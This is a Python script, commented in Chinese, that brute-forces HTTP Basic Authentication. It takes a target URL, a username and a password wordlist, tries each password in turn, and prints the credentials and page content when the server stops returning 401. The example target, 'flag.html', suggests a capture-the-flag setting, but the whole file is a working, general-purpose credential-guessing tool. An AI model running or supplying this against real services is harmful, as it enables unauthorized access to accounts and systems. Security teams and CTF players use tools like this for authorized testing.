#!/usr/bin/env python3
"""
Basic Auth 暴力破解脚本
用法: python3 basic_auth_brute.py <目标URL> <用户名> <密码字典路径>
示例: python3 basic_auth_brute.py http://target.com/flag.html admin ../10_million_password_list_top_100.txt
"""

import sys
import requests


def brute_force(url: str, username: str, dict_path: str):
    print(f"[*] 目标: {url}")
    print(f"[*] 用户名: {username}")
    print(f"[*] 字典: {dict_path}")
    print("[*] 开始爆破...\n")

    count = 0
    with open(dict_path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            pwd = line.strip()
            if not pwd:
                continue
            count += 1

            try:
                r = requests.get(url, auth=(username, pwd), timeout=10)
            except requests.RequestException as e:
                print(f"[!] 请求异常: {e}")
                continue

            if r.status_code != 401:
                print()
                print(f"[+] 爆破成功! 第 {count} 次尝试")
                print(f"[+] 用户名: {username}")
                print(f"[+] 密码: {pwd}")
                print(f"[+] HTTP状态码: {r.status_code}")
                print(f"[+] 响应内容:")
                print(r.text)
                return True

            if count % 10 == 0:
                print(f"[.] 已尝试 {count} 次...")

    print()
    print("[-] 字典遍历完毕，未找到有效密码")
    return False


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("用法: python3 basic_auth_brute.py <URL> <用户名> <字典路径>")
        print("示例: python3 basic_auth_brute.py http://target.com/flag.html admin dict.txt")
        sys.exit(1)

    url, user, dict_file = sys.argv[1], sys.argv[2], sys.argv[3]
    success = brute_force(url, user, dict_file)
    sys.exit(0 if success else 1)
